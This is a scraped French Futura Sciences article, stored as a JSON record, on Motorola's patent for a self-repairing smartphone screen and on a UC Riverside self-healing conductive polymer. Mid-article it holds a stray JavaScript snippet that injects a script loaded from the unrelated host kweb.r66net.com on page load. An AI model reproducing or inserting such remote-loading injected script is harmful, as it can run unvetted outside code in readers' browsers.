{"title": "Motorola imagine un ecran qui s'autorepare", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-18", "content": "Motorola a invente un ecran de smartphone capable de detecter des rayures et de les reparer grace a un polymere a memoire de forme chauffe. Mais les smartphones a ecran autoreparable ne sont pas pour tout de suite. Voici un scenario que l'on aimerait bien voir se realiser pour de bon. Suite a une chute ou un frottement avec des cles dans une poche ou un sac, votre  smartphone  presente des rayures a la surface de son ecran. Le mobile affiche une notification et propose de lancer une procedure de reparation automatique. Il suffit alors d'entourer avec le doigt la ou les zones endommagees et l'appareil fait le reste. Quelques instants plus tard, l'ecran est comme neuf ! Cette idee existe, du moins sous la forme d'un brevet depose par  Motorola  aupres du bureau americain des brevets et des marques (USPTO). Le document decrit un  smartphone  equipe de  capteurs  susceptibles de detecter la presence de rayures sur l'ecran et d'activer une reparation automatique. Le processus repose sur un <<  polymere  a memoire de forme >> qui peut retrouver son etat d'origine lorsqu'il est chauffe. Cela fonctionnerait vraisemblablement pour des rayures peu profondes, mais sans doute pas pour des fissures importantes. Selon le brevet depose par Motorola, l'utilisateur d'un smartphone n'aurait qu'a delimiter avec le doigt la zone rayee de l'ecran puis lancer le processus d'autoreparation. (c) Motorola                         ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Quid de la securite de l'utilisateur et de la batterie du smartphone ? Ce  materiau  serait compatible aussi bien avec des  ecrans LCD  que Oled. Cela implique que le smartphone integre un systeme de  resistances  capable d'emettre la  chaleur  necessaire pour enclencher la  cicatrisation . Seduisant sur le papier, ce dispositif souleve tout de meme d'importantes questions relatives a la securite. On ignore a quelle temperature le polymere a memoire de forme demanderait a etre chauffe pour fonctionner et si l'utilisateur peut ou non manipuler le mobile durant la phase d'autoreparation. Par ailleurs, on peut s'interroger sur l' incidence  d'un tel systeme sur la  batterie . En effet, toute surchauffe fait peser un risque de  combustion  voire d'explosion sous l'effet d'un  emballement thermique . L'idee d'un polymere autoreparant compatible avec les ecrans de smartphone a deja ete testee avec succes en laboratoire (voir notre actualite ci-apres). Mais du laboratoire au produit fini, il y a un pas enorme a franchir qui n'est pas pour tout de suite. Pour en savoir plus Smartphones : vers des ecrans qui s'autoreparent Article initial de  Marc Zaffagni , paru le 5/04/2017 Des chercheurs ont developpe un materiau polymere capable d'autoreparer des entailles et des rayures. La vraie nouveaute est sa capacite a conduire l'electricite, ce qui permettrait de l'employer pour les  ecrans tactiles  des smartphones et aussi les batteries. Il y a quelques annees, LG avait sorti un  smartphone , le G Flex, dote d'un ecran courbe et d'une coque arriere faite d'un materiau capable de reparer les rayures et eraflures peu profondes occasionnees par un usage quotidien. Malheureusement, ledit polymere ne pouvait pas servir pour proteger l'ecran du mobile car il n'etait pas conducteur. Des chimistes de l'universite de Californie a Riverside viennent de creer un tel materiau, capable de s'autoreparer tout en conduisant l'electricite. Ses concepteurs estiment qu'a terme il pourrait etre employe dans les ecrans tactiles des smartphones qui seraient alors en mesure de reparer des dommages superficiels suite a une chute ou une rayure. Voila qui rassurerait probablement les futurs possesseurs d'un  Samsung Galaxy S8  dont l'ecran Amoled recourbe, quasiment sans bordures, est absolument superbe mais vraisemblablement tres fragile. Le secret de ce materiau reside dans les  liaisons chimiques  de ses  molecules . Comme l'expliquent les chercheurs a l'origine de cette innovation, il existe deux types de liaisons chimiques dans les materiaux. D'une part, les  liaisons covalentes  qui sont  solides  et ne se reforment pas une fois rompues. D'autre part, les liaisons dites non-covalentes qui sont moins solides mais aussi plus dynamiques. Le meilleur exemple de ce type de liaison non covalente est celui de l'eau dont les molecules d' hydrogene  peuvent se briser et se reformer constamment. A gauche, un morceau du polymere conducteur et autoreparant dans lequel a ete pratiquee une entaille. A droite, le meme morceau 24 heures plus tard s'est en grande partie reforme. (c) Wang Lab,  University of California at Riverside                               Le polymere s'autorepare en 24 heures Le polymere cree par l'equipe de l'universite de Californie emmenee par le professeur Chao Wang est lie par une force intermoleculaire dipole qui s'exerce entre des  ions  charges et des molecules polarisees. En l'occurrence, le materiau se compose de sel et d'un polymere etirable. Les chercheurs l'ont mis a l'epreuve en l'etirant jusqu'a cinquante fois sa taille d'origine. Apres avoir ete coupe en deux, il s'est ressoude de lui-meme en 24 heures. Enfin, pour tester la  conductivite  du materiau, le professeur Wang et ses chimistes ont cree ce qu'ils presentent comme un  muscle artificiel  en  intercalant  une membrane non conductrice entre deux couches de leur polymere ionique. Resultat, le dispositif s'est mis a bouger sous l'influence de signaux electriques.  D'apres les chercheurs de l'universite de Californie a Riverside, ce materiau pourrait etre employe dans des ecrans de smartphones et des batteries a l'horizon 2020. D'ici la, ils vont s'employer a le rendre encore plus performant, notamment dans des conditions de forte humidite, l'objectif etant qu'il puisse resister a des situations d'utilisation reelles. Ces travaux on fait l'objet d'une presentation durant une rencontre organisee par l' American Chemical Society  qui s'est tenue cette semaine en Californie (Etats-Unis). Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  smartphones  |  yeux ecrans  |  fond ecrans zen  |  gestion ecrans  |  ecrans souples  |  portable ecrans  |  ecrans apres demain", "theme": "tech"}